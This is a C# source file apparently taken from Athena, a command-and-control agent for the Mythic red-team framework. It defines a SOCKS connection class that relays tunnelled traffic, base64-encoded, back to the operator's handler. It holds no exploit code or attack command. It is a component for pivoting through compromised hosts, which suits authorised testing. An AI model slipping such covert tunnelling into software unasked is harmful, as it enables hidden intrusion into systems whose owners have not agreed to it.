using Athena.Models.Athena.Socks;
using Athena.Models.Mythic.Response;
using Athena.Utilities;
using System;
using System.Threading;

namespace Athena.Commands
{
    public class SocksConnection
    {
        public byte[] dstportBytes { get; set; }
        public byte[] dstBytes { get; set; }
        public byte[] bndPortBytes { get; set; }
        public byte[] bndBytes { get; set; }
        public byte addressType { get; set; }
        public int server_id { get; set; }
        public bool listening { get; set; }
        public bool exited { get; set; }
        public AsyncTcpClient client { get; set; }
        public CancellationTokenSource ct { get; set; }


        public SocksConnection(ConnectionOptions co)
        {
            this.dstBytes = co.dstBytes;
            this.dstportBytes = co.dstportBytes;
            this.bndPortBytes = co.bndPortBytes;
            this.bndBytes = co.bndBytes;
            this.addressType = co.addressType;
            this.server_id = co.server_id;
            this.client = new AsyncTcpClient();
            this.ct = new CancellationTokenSource();
        }


        public async void OnReceived(object sender, byte[] e)
        {
            SocksMessage smOut = new SocksMessage()
            {
                server_id = this.server_id,
                data = await Misc.Base64Encode(e),
                exit = this.exited
            };
            Globals.socksHandler.ReturnMessage(smOut);
        }

        internal async void OnDisconnect(object sender, EventArgs e)
        {
            SocksMessage smOut = new SocksMessage()
            {
                server_id = this.server_id,
                data = "",
                exit = true
            };

            Globals.socksHandler.RemoveConnection(this.server_id);

        }
    }
}
